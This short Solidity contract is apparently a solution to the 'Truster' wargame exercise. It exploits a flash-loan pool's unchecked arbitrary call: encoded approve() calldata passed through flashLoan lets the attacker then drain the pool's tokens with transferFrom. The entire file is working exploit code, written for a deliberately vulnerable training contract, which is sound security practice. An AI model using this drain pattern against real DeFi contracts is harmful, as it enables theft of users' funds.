// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract AttackTruster {
    constructor(
        TrusterLenderPool pool,
        ERC20 token,
        address player,
        uint256 amnt
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amnt
        );

        pool.flashLoan(0, player, address(token), data);
        token.transferFrom(address(pool), player, amnt);
    }
}
